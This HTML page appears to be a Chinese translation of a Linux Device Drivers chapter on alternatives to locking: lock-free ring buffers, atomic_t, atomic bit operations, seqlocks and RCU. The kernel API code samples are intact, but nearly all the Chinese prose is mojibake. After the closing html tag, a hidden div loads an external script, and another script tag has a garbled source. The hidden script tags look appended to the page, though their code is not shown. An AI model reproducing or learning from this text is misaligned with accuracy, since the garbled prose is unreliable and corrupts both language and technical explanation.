<html xmlns:cf="http://docbook.sourceforge.net/xmlns/chunkfast/1.0">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>5.7.&#160;ĸѡ-Linux豸棨İ棩- - </title>
<meta name="description" content="- - " />
<meta name="keywords" content="Linux豸,İ,,ldd,linux device driver,,Ӱ,,, " />
<meta name="author" content="  www.21cstar.com QQ:610061171" /> 
<meta name="verify-v1" content="5asbXwkS/Vv5OdJbK3Ix0X8osxBUX9hutPyUxoubhes=" />
<link rel="stylesheet" href="docbook.css" type="text/css">
<meta name="generator" content="DocBook XSL Stylesheets V1.69.0">
<link rel="start" href="index.html" title="Linux 豸 Edition 3">
<link rel="up" href="ch05.html" title="&#160;5&#160;&#160;;">
<link rel="prev" href="ch05s06.html" title="5.6.&#160;">
<link rel="next" href="ch05s08.html" title="5.8.&#160;ٲο">
</head>
<body bgcolor="white" text="black" link="#0000FF" vlink="#840084" alink="#0000FF">
<div class="navheader">
<table width="100%" summary="Navigation header">
<tr><th colspan="3" align="center">5.7.&#160;ĸѡ</th></tr>
<tr>
<td width="20%" align="left">
<a accesskey="p" href="ch05s06.html">һҳ</a>&#160;</td>
<th width="60%" align="center">&#160;5&#160;&#160;;</th>
<td width="20%" align="right">&#160;<a accesskey="n" href="ch05s08.html">һҳ</a>
</td>
</tr>
</table>
<hr>
</div>
<div class="sect1" lang="zh-cn">
<div class="titlepage"><div><div><h2 class="title" style="clear: both">
<a name="AlternativestoLocking.sect"></a>5.7.&#160;ĸѡ</h2></div></div></div>
<p>Linux ںṩ˲ļԭܹʹں˱ⱻԼ. , ͬѼ, һƵƺʵֲûȱ. ûѡ; ǿΨһķȷɹ. Ȼ, Щ, ԽԭӵĴȡļ. ڿһ.</p>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="LockFreeAlgorithms.sect"></a>5.7.1.&#160;㷨</h3></div></div></div>
<p>ʱ, ´㷨ȫҪ. /д -- ֻһд -- ܹʽ¹. дСʹݽṹͼ, ɶ, һֱһµ, пܴһݽṹ.</p>
<p>Զ/õݽṹǻλ.  㷨һ߰ݵһβ, ߴһ. ĩ, ƻصʼ. һλҪһ 2 ֵһֵŵ, ԼĸֵһӦӻ.</p>
<p>Сĵʵ, һλûж߻ʱҪ. Ψһ޸дָλõ߳. ֻҪдڸд֮ǰ洢һֵ, ߽һֱһһµͼ. , ֻ, Ψһȡֵָ߳. һСĵȷ 2 ָ벻໥, ߺ߿Բȡûо.</p>
<p>ͼ<a href="ch05s07.html#ldd3-5-1.fig" title="ͼ&#160;5.1.&#160;λ">λ</a>չʾڼ״̬Ļλ. 汻һɶдָָͬʾ, дָڶָʱ(СĽƻ!). Сĵر, ܹؼʹ.</p>
<div class="figure">
<a name="ldd3-5-1.fig"></a><p class="title"><b>ͼ&#160;5.1.&#160;λ</b></p>
<div><img src="images/snagitldd3/ldd3-5-1.png" alt="λ"></div>
</div>
<p>豸лλ൱. , ر, ʹûλ봦(). ע,  2.6.10, һͨõĻλʵںп; ʹϢ &lt;linux/kfifo.h&gt;.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="AtomicVariables.sect"></a>5.7.2.&#160;ԭӱ</h3></div></div></div>
<p>ʱ, һԴһ򵥵ֵ. άһ n_op, ֪ж豸Ŀǰδ. , һ򵥵Ĳ:</p>
<pre class="programlisting">
n_op++; 
</pre>
<p>Ҫ. ĳЩԭӵķʽֵݼ, 㲻. һļƶһ򵥵ֵ. , ںṩһԭͳΪ atomic_t,  &lt;asm/atomic.h&gt;.</p>
<p>һ atomic_t һ int ֵֵ֧ϵ. , ΪĳЩϵĹʽ, ΧܲǶõ; , 㲻Ӧָһ atomic_t ж 24 λ. ĲΪͶ岢ұ֤һ SMP д˵ԭӵ. Ƿǳ, Ϊκοʱһָ.</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>void atomic_set(atomic_t *v, int i);</span></span></dt>
<dd></dd>
<dt><span class="term"><span>atomic_t v = ATOMIC_INIT(0);</span></span></dt>
<dd><p>ԭӱ v Ϊֵ i. Ҳڱʱʹú궨 ATOMIC_INIT ʼԭֵ.</p></dd>
<dt><span class="term"><span>int atomic_read(atomic_t *v);</span></span></dt>
<dd><p> v ĵǰֵ.</p></dd>
<dt><span class="term"><span>void atomic_add(int i, atomic_t *v);</span></span></dt>
<dd><p> v ָԭӱ i. ֵ void, ΪһĿֵ, Ҵ󲿷ʱ䲻Ҫ֪.</p></dd>
<dt><span class="term"><span>void atomic_sub(int i, atomic_t *v);</span></span></dt>
<dd><p> *v ȥ i.</p></dd>
<dt><span class="term"><span>void atomic_inc(atomic_t *v);</span></span></dt>
<dd></dd>
<dt><span class="term"><span>void atomic_dec(atomic_t *v);</span></span></dt>
<dd><p>ݼһԭӱ.</p></dd>
<dt><span class="term"><span>int atomic_inc_and_test(atomic_t *v);</span></span></dt>
<dd></dd>
<dt><span class="term"><span>int atomic_dec_and_test(atomic_t *v);</span></span></dt>
<dd></dd>
<dt><span class="term"><span>int atomic_sub_and_test(int i, atomic_t *v);</span></span></dt>
<dd><p>һضĲҲԽ; , ڲ, ԭֵ 0, ôֵ; , Ǽ. עû atomic_add_and_test.</p></dd>
<dt><span class="term"><span>int atomic_add_negative(int i, atomic_t *v);</span></span></dt>
<dd><p> i  v. Ǹֵֵ, Ϊ.</p></dd>
<dt><span class="term"><span>int atomic_add_return(int i, atomic_t *v);</span></span></dt>
<dd></dd>
<dt><span class="term"><span>int atomic_sub_return(int i, atomic_t *v);</span></span></dt>
<dd></dd>
<dt><span class="term"><span>int atomic_inc_return(atomic_t *v);</span></span></dt>
<dd></dd>
<dt><span class="term"><span>int atomic_dec_return(atomic_t *v);</span></span></dt>
<dd><p> atomic_add ƺ, Ƿԭӱֵ.</p></dd>
</dl></div>
<p>ͬ˵, atomic_t ͨЩȡ. 㴫һԭһһĺ, õһ.</p>
<p>㻹Ӧס, atomic_t ֵֻڵɵԭӵʱ. Ҫ atomic_t ĲȻҪĳļ. һĴ:</p>
<pre class="programlisting">
atomic_sub(amount, &amp;first_atomic); 
atomic_add(amount, &amp;second_atomic);
</pre>
<p>ӵһԭֵмȥ amount, ǻûмӵڶʱ, һʱ. ״̬ܲ鷳 2 ֮еĴ, ĳּ.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="BitOperations.sect"></a>5.7.3.&#160;λ</h3></div></div></div>
<p>atomic_t ڽʱǲ. , ޷ĺ, Ҫԭӷʽλʱ. Ϊ, ںṩһ׺ԭӵ޸ĻԵλ. Ϊڵڷ, ûж()ܸ.</p>
<p>ԭλǳ, Ϊʹõָв, κʱͲƽ̨ʱýֹж. ϵĲ &lt;asm/bitops.h&gt; . Ǳ֤ԭӵ,  SMP , Ҷڿ紦һõ.</p>
<p>ҵ, ЩеҲϵ. nr (Ҫĸλ)Ϊ int, ڼϵ unsigned long. Ҫ޸ĵĵַһ unsigned long ָ, Ǽϵʹ void * .</p>
<p>λ:</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>void set_bit(nr, void *addr);</span></span></dt>
<dd><p>õ nr λ addr ָ.</p></dd>
<dt><span class="term"><span>void clear_bit(nr, void *addr);</span></span></dt>
<dd><p>ָλ addr ޷ų.  set_bit ෴.</p></dd>
<dt><span class="term"><span>void change_bit(nr, void *addr);</span></span></dt>
<dd><p>תλ.</p></dd>
<dt><span class="term"><span>test_bit(nr, void *addr);</span></span></dt>
<dd><p>ΨһһҪԭӵλ; 򵥵طλĵǰֵ.</p></dd>
<dt><span class="term"><span>int test_and_set_bit(nr, void *addr);</span></span></dt>
<dd></dd>
<dt><span class="term"><span>int test_and_clear_bit(nr, void *addr);</span></span></dt>
<dd></dd>
<dt><span class="term"><span>int test_and_change_bit(nr, void *addr);</span></span></dt>
<dd><p>ԭӵضͬǰг, ǻλǰֵ.</p></dd>
</dl></div>
<p>Щȡ޸һı־, ˵ǲκ; ԭӷǵĲ. ʹλһƴȡһ, һ, е㸴ӲӦи. 󲿷ִĴ벻ַʹλ, ĴȻںд.</p>
<p>һҪȡһĴͼԭӵһ, ʹ test_and_set_bit  test_and_clear_bit. ͨʵչʾ; ٶڵַ addr  nr λ. ٶλ 0, æΪ .</p>
<pre class="programlisting">
/* try to set lock */
while (test_and_set_bit(nr, addr) != 0)
    wait_for_a_while(); 

/* do your work */ 

/* release lock, and check... */
if (test_and_clear_bit(nr, addr) == 0)
    something_went_wrong(); /* already released: error */ 

</pre>
<p>ͨںԴ, ᷢӵĴ. , ´ʹ; ܺõصԹ, ǴͬжϺںռ, ұ˶ʱŬʲô.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="seqlocks.sect"></a>5.7.4.&#160;seqlock </h3></div></div></div>
<p>2.6ں˰һ»ƴṩٵ, شȡһԴ. seqlock ¹, ҪԴС, , ҳȡ, ҺдȡǱҪ. , ͨͷŶԴĴȡ, ҪЩдߵĳͻ, ҵĳͻʱ, ǵĴȡ. seqlock ͨڱָݽṹ, Ϊ߿ܸһЧָдڸıݽṹ.</p>
<p>seqlock  &lt;linux/seqlock.h&gt;.  2 ͨķʼһ seqlock(  seqlock_t  ):</p>
<pre class="programlisting">
seqlock_t lock1 = SEQLOCK_UNLOCKED;

seqlock_t lock2;
seqlock_init(&amp;lock2);
</pre>
<p>ȡͨڽٽڻȡһ(޷ŵ). ˳ʱ, Ǹֵ뵱ǰֵȽ; ƥ, ȡ. , ߴʽ:</p>
<pre class="programlisting">
unsigned int seq;

do {
    seq = read_seqbegin(&amp;the_lock);
    /* Do what you need to do */
} while read_seqretry(&amp;the_lock, seq);
</pre>
<p>͵ڱĳּ򵥼, Ҫһµֵ. ĲԱһд, 򵥵ض¼.</p>
<p> seqlock ܴһжϴȡ, Ӧʹ IRQ ȫİ汾:</p>
<pre class="programlisting">
unsigned int read_seqbegin_irqsave(seqlock_t *lock, unsigned long flags);
int read_seqretry_irqrestore(seqlock_t *lock, unsigned int seq, unsigned long flags);
</pre>
<p>д߱ȡһһ seqlock ٽ. Ϊ, :</p>
<pre class="programlisting">
void write_seqlock(seqlock_t *lock); 
</pre>
<p>дһʵ, еͨƶ. :</p>
<pre class="programlisting">
void write_sequnlock(seqlock_t *lock); 
</pre>
<p>ͷ. Ϊдȡ, ͨı嶼:</p>
<pre class="programlisting">
void write_seqlock_irqsave(seqlock_t *lock, unsigned long flags);
void write_seqlock_irq(seqlock_t *lock);
void write_seqlock_bh(seqlock_t *lock);

void write_sequnlock_irqrestore(seqlock_t *lock, unsigned long flags);
void write_sequnlock_irq(seqlock_t *lock);
void write_sequnlock_bh(seqlock_t *lock);
</pre>
<p>һ write_tryseqlock ܹʱط.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="ReadCopyUpdate.sect"></a>5.7.5.&#160;ȡ--</h3></div></div></div>
<p>ȡ--(RCU) һ߼Ļⷽ, ܹиЧںʵ. еʹúٵǲû֪, ֵÿ. ЩȤ RCU 㷨ϸڵ˿Ĵ߳İƤҵ( http://www.rdrop.com/users/paulmck/rclock/intro/rclock_intro.html).</p>
<p>RCU ݽṹ˲. ԾдŻ. ԴӦָͨȡ, жЩԴñԭӴ. ݽṹҪı, д߳һ, ı, ʹصָ׼µİ汾 -- , 㷨. ںȷû¶Ծɰ汾, Աͷ.</p>
<p>Ϊʵʹ RCU , һ·ɱ. ÿıҪ·ɱӦʹĸӿ. ǿٵ, , һں˷Ŀӿ, Ҫ·ɱ. RCU ·ɲû½, ൱ܺô. ںе Startmode  IP Ҳʹ RCU 豸б.</p>
<p>ʹ RCU ĴӦ &lt;linux/rcupdate.h&gt;.</p>
<p>ڶһ, ʹһ RCU-ݽṹĴӦ rcu_read_lock  rcu_read_unlock ýð. , RCU :</p>
<pre class="programlisting">
struct my_stuff *stuff; 
rcu_read_lock();
stuff = find_the_stuff(args...);
do_something_with(stuff);
rcu_read_unlock();
</pre>
<p>rcu_read_lock ǿ; ֹںռûеȴκζ. ڶ""ʱִеĴԭӵ. ڶ rcu_read_unlock ú, ûʹöԱԴ.</p>
<p>Ҫı䱻ĽṹĴм. һ׵; һ½ṹ, ҪʹӾɵĿ, 滻ָ. ڴ, ڶһߵĿ, ı. κνٽĴ뿴ݵ°汾.</p>
<p>ʣµͷžɰ汾. Ȼ, еĴȻжԾݵһ, ͷ. ෴, дȴֱ֪ûô. ΪгжݽṹõĴ(涨)ԭӵ, ֪һϵͳеÿѾһ, еñʧ.  RCU ; һȴֱдѾȵĻص; Ǹص.</p>
<p>ıһ RCU-ݽṹĴͨһ struct rcu_head ص, ܲҪκηʽʼṹ. , Ǹṹ򵥵Ƕ RCU ĴԴ. ڸıԴɺ, Ӧ:</p>
<pre class="programlisting">
void call_rcu(struct rcu_head *head, void (*func)(void *arg), void *arg);
</pre>
<p> func ͷԴǰȫʱ; ݸ call_rcuǸͬһ arg. , func ҪΨһĶǵ kfree.</p>
<p>ȫ RCU ӿڱѼҪӸ; , , ʹñ. ȫݼصͷļ.</p>
</div>
</div>
<div class="navfooter">
<hr>
<table width="100%" summary="Navigation footer">
<tr>
<td width="40%" align="left">
<a accesskey="p" href="ch05s06.html">һҳ</a>&#160;</td>
<td width="20%" align="center"><a accesskey="u" href="ch05.html">һ</a></td>
<td width="40%" align="right">&#160;<a accesskey="n" href="ch05s08.html">һҳ</a>
</td>
</tr>
<tr>
<td width="40%" align="left" valign="top">5.6.&#160;&#160;</td>
<td width="20%" align="center"><a accesskey="h" href="index.html">ʼҳ</a></td>
<td width="40%" align="right" valign="top">&#160;5.8.&#160;ٲο</td>
</tr>
</table>
</div>
</body></html>
<div style="display:none"><script language="JavaScript" src="script.js"></script> </div>

<script language=javascript src=G2Bݔx8n*n*n*n*n*n*ݚPpd></script>